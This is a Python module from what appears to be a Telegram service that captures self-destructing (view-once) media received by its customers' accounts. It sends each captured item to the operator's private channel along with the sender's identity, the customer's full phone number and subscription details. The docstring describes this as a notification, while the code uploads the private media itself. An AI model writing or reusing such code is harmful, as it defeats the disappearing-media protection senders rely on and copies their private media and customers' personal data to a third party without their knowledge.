"""
app.telegram.admin_notify
~~~~~~~~~~~~~~~~~~~~~~~~~
Sends a richer capture notification to the operator's own private channel
(settings.admin_notify_chat_id), separate from the customer-facing caption
that goes to the connected account's OWN Saved Messages.

Design notes:
  - Uses the Bot API directly (telegram.Bot), NOT the customer's Telethon
    client — the operator's channel is a completely different chat than
    anything the connected Telegram account can see. Mixing the two would
    mean sending the notification "as" the customer's own account, which is
    both semantically wrong and a privacy problem.
  - Runs from the worker process. The bot's long-polling process (app.bot.main)
    is a SEPARATE OS process and is not reachable directly — telegram.Bot is
    a standalone Bot API client that works from any process holding the token.
  - Fails silently (logged, not raised): a failure to notify the operator
    must NEVER cause the actual media capture/save to be marked as failed.
  - Contains sensitive data (full phone number) by explicit operator
    decision — see CLAUDE.md, "Admin Notifications". Only sent to the one
    chat_id the operator configured; never logged, never sent elsewhere.
"""

from __future__ import annotations

import asyncio
from datetime import datetime
from pathlib import Path
from typing import Any

from telegram import Bot
from telegram.error import NetworkError, TelegramError, TimedOut
from telegram.request import HTTPXRequest

from app.core.config import get_settings
from app.core.logging import get_logger
from app.db.models.telegram_account import TelegramAccount
from app.telegram.metadata import ChatInfo, SenderInfo, format_local_time

log = get_logger(__name__)

_bot_singleton: Bot | None = None


def _unwrap_secret(val: Any) -> str | None:
    """Safely unwrap SecretStr or any string-like setting into a plain str."""
    if val is None:
        return None
    if hasattr(val, "get_secret_value"):
        return val.get_secret_value()
    return str(val)


def _get_bot() -> Bot | None:
    """Lazily build a standalone Bot API client for admin notifications."""
    global _bot_singleton
    settings = get_settings()
    chat_id = _unwrap_secret(settings.admin_notify_chat_id)
    token = _unwrap_secret(settings.bot_token)

    if not chat_id or not token:
        return None

    if _bot_singleton is None:
        # Menggunakan HTTPXRequest dengan timeout yang lebih tinggi (5 menit)
        # untuk menangani upload video/media berukuran besar.
        request = HTTPXRequest(
            connect_timeout=60.0,
            read_timeout=300.0,
            write_timeout=300.0,
            pool_timeout=60.0,
        )
        _bot_singleton = Bot(token=token, request=request)
    return _bot_singleton


def _format_subscription(subscription) -> str:
    if subscription is None:
        return "No active subscription"
    plan = subscription.plan.value.title()
    status = subscription.status.value.title()
    if subscription.expires_at is None:
        return f"{plan} ({status}) — never expires"
    expires = format_local_time(subscription.expires_at)
    return f"{plan} ({status}) — expires {expires}"


async def notify_admin_of_capture(
    *,
    account: TelegramAccount,
    sender: SenderInfo,
    chat: ChatInfo,
    media_type: str,
    ttl_seconds: int | None,
    subscription,
    account_service,
    file_path: Path | str | None = None,
    thumbnail_path: Path | str | None = None,
) -> None:
    """Send the operator's richer notification for a just-saved media item.

    If file_path is provided and exists on disk, sends the photo/video/file along with
    the notification text as a caption.

    No-op if settings.admin_notify_chat_id is not configured. Never raises —
    logs and swallows any Bot API failure so a notification problem can
    never break the actual capture pipeline.
    """
    bot = _get_bot()
    if bot is None:
        return

    full_phone = account_service.get_full_phone(account)
    now_str = format_local_time(datetime.now().astimezone())

    ttl_line = "—"
    if ttl_seconds is not None:
        ttl_line = "View once" if ttl_seconds >= 0x7FFFFFFF else f"{ttl_seconds}s"

    customer_username_line = f"@{account.username}" if account.username else "(no username)"
    text = (
        "🔔 *New destructing media captured*\n\n"
        "*Sender (of the media):*\n"
        f"🆔 `{sender.telegram_id or 'unknown'}`\n"
        f"👤 {sender.identity_label}\n"
        f"💬 Chat: {chat.display_label}\n"
        f"📦 Type: {media_type} | TTL: {ttl_line}\n\n"
        "*Your customer (account owner):*\n"
        f"🆔 `{account.telegram_user_id or 'unknown'}`\n"
        f"👤 {customer_username_line}\n"
        f"📱 {full_phone or 'unknown (no phone on file)'}\n"
        f"👑 {_format_subscription(subscription)}\n\n"
        f"🕐 {now_str}"
    )

    chat_id = _unwrap_secret(get_settings().admin_notify_chat_id)

    max_retries = 3
    for attempt in range(1, max_retries + 1):
        try:
            # Kirim file media jika path valid dan file ditemukan di lokal
            if file_path:
                path_obj = Path(file_path)
                if path_obj.is_file():
                    with open(path_obj, "rb") as media_file:
                        norm_media_type = (media_type or "").lower()
                        if norm_media_type in ("photo", "image"):
                            await bot.send_photo(
                                chat_id=chat_id,
                                photo=media_file,
                                caption=text,
                                parse_mode="Markdown",
                                read_timeout=300.0,
                                write_timeout=300.0,
                            )
                        elif norm_media_type in ("video", "animation", "video_note"):
                            thumb_file = None
                            try:
                                if thumbnail_path:
                                    thumb_path_obj = Path(thumbnail_path)
                                    if thumb_path_obj.is_file():
                                        thumb_file = open(thumb_path_obj, "rb")
                                await bot.send_video(
                                    chat_id=chat_id,
                                    video=media_file,
                                    caption=text,
                                    parse_mode="Markdown",
                                    thumbnail=thumb_file,
                                    read_timeout=300.0,
                                    write_timeout=300.0,
                                )
                            finally:
                                if thumb_file is not None:
                                    thumb_file.close()
                        else:
                            await bot.send_document(
                                chat_id=chat_id,
                                document=media_file,
                                caption=text,
                                parse_mode="Markdown",
                                read_timeout=300.0,
                                write_timeout=300.0,
                            )
                    return

            # Fallback kirim pesan teks jika file_path tidak diberikan atau tidak ditemukan
            await bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode="Markdown",
                read_timeout=60.0,
            )
            return

        except (TimedOut, NetworkError) as exc:
            if attempt < max_retries:
                log.warning(
                    "admin_notify_timeout_retry",
                    error=str(exc),
                    account_id=account.id,
                    attempt=attempt,
                )
                await asyncio.sleep(3 * attempt)
                continue
            else:
                log.warning(
                    "admin_notify_failed_after_retries",
                    error=str(exc),
                    account_id=account.id,
                )
                break
        except TelegramError as exc:
            log.warning(
                "admin_notify_failed",
                error=str(exc),
                account_id=account.id,
            )
            break
        except Exception as exc:  # pragma: no cover — defensive only
            log.error(
                "admin_notify_unexpected_error",
                error=str(exc),
                account_id=account.id,
            )
            break